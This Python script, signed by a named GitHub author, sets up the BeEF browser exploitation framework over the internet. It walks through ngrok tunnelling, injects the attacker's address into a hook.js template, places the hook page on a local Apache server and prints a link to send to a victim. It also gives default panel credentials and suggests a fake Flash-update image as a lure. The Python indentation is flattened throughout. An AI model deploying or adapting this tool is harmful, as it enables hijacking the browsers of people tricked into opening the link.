#!/usr/bin/env python3

-- coding: utf-8 --
import random
import string
import argparse
import os
from termcolor import colored

Filename = "hook.js"

def instruction():
return """
Instructions :
You need two Links which are Forwarded To LocalHost:80 and LocalHost:3000
\t1. To send to Victim.
\t2. Beef listens on Port 3000, so this link should be forwarded to LocalHost:3000.

Just Enter your links in the Script. The Script will do necessary changes required to opt for your Links.
"""

def ngrok():
return """
NGROK Steps :

STEP 1: Add these Lines To ngrok.yml [Location .ngrok2/ngrok.yml]

    tunnels:
    first-app:
    addr: 80
    proto: http
    second-app:
    addr: 3000
    proto: http
STEP 2: Now Start ngrok with:
ngrok start --all

STEP 3: You will See 2 different links Forwarded to
Localhost:80 [Link To be Sent to Victim]
Localhost:3000 [Your Link will be Connecting to..]

STEP 4: Enter these links in Script and Follow The Steps given in Script.
"""

def banner():
return """

| _ \ | | / __ \ \ \ / /\ | \ | |
| |) | ___ | | | | | | _____ _ __ \ \/\ / / \ | \| |
| _ < / _ \/ _ \ | | | | \ \ / / _ \ '| \ / / /\ \ | . ` |
| |) | __/ / | | || |\ V / __/ | \/ \/ / \ \ | |\ |
|/ \|\|| \/ \/ \|| \/ \/ \\| \_|

BY SKS \n\n https://github.com/stormshadow07
"""

def color(text, color=None):
if color:
return colored(text, color)

# Default colors based on prefix
if text.strip().startswith("[!]"):
    return colored(text, 'red')
elif text.strip().startswith("[+]"):
    return colored(text, 'green')
elif text.strip().startswith("[?]"):
    return colored(text, 'yellow')
elif text.strip().startswith("[*]"):
    return colored(text, 'blue')
else:
    return text
def string_replace(filename, old_string, new_string):
try:
with open(filename, 'r') as f:
s = f.read()
if old_string not in s:
print(f'"{old_string}" not found in {filename}.')
return

    with open(filename, 'w') as f:
        s = s.replace(old_string, new_string)
        f.write(s)
        print(color('[✔] File Changed...', 'green'))

except FileNotFoundError:
    print(color(f'[!] File {filename} not found.', 'red'))
if name == 'main':
os.system("clear" if os.name != 'nt' else "cls")

print(color(instruction(), "green"))
print(color("[*] IF you want to Do this Without Port Forwarding: Use NGROK\n"))
ng_check = input(color("[?] Press '1' to see NGROK Instructions else Press '0': "))
if ng_check == '1':
    print(color(ngrok(), "green"))
    input(color("[?] Press Enter to Continue ..."))

os.system("clear" if os.name != 'nt' else "cls")
print(color("Checking Services Status Required", "blue"))
os.system("service apache2 start")
os.system("beef-xss")
os.system("clear" if os.name != 'nt' else "cls")
print(color("All Good So far ... \nClose The Browser If Prompted ..", "green"))
print(color(banner(), "green"))

send_to = input(color('[?] Enter Address of Link [You are Sending to Victim]: '))
send_to = send_to.rstrip()
print(color("[+] Send_To Link  : " + send_to, "green"))
connect_to = input(color('[?] Enter Address of Link [Your Link will be Connecting to..]: '))
connect_to = connect_to.rstrip()
print(color("[+] Connect_To Link  : " + connect_to, "green"))

print(color('[✔] Checking directories...', 'green'))
if not os.path.isdir("./temp"):
    os.makedirs("./temp")
    print(color("[+] Creating [./temp] directory for resulting code files", "green"))
else:
    os.system("rm -rf temp/*")
    print(color("Clean Successful", "green"))

connect_to_full = 'http://' + connect_to + ":80/hook.js"
connect_to_panel = 'http://' + connect_to + "/ui/panel"
send_to_full = 'http://' + send_to + '/beef.html'

os.system("cp base.js ./temp/hook.js")
string_replace("./temp/hook.js", "SKS_1", connect_to_full)
string_replace("./temp/hook.js", "SKS_2", connect_to)

os.system("cp beef.html ./temp/beef.html")
string_replace("./temp/beef.html", "SKS_3", send_to)
os.system("cp ./temp/* /var/www/html/")
os.system("chmod a+rw /var/www/html/hook.js")

print(color("\n==================================== RESULT ====================================\n", "blue"))
print(color("[+] Access The BeeF Control Panel Using: {}".format(connect_to_panel), "green"))
print(color("\t Username = beef\n\t Password = beef\n", "blue"))
print(color("[+] Hooked Link To Send to Victim: " + send_to_full, "green"))
print(color('[?]\n\nNote: I know few of the Exploits do not work due to Updated Browsers and stuff...\n\nTip: Change Payload or Images Address to your Connect_to Address with Port 80\n\t Example:\n\t\t', "blue"))
print(color("\tFROM Image URL: http://0.0.0.0:3000/adobe/flash_update.png\n", "red"))
print(color("\tTO Image URL: http://{}:80/adobe/flash_update.png\n".format(connect_to), "green"))
print(color('\nHappy Hacking !!!\nHave Problem or Tip? Contact: https://github.com/stormshadow07', "green"))
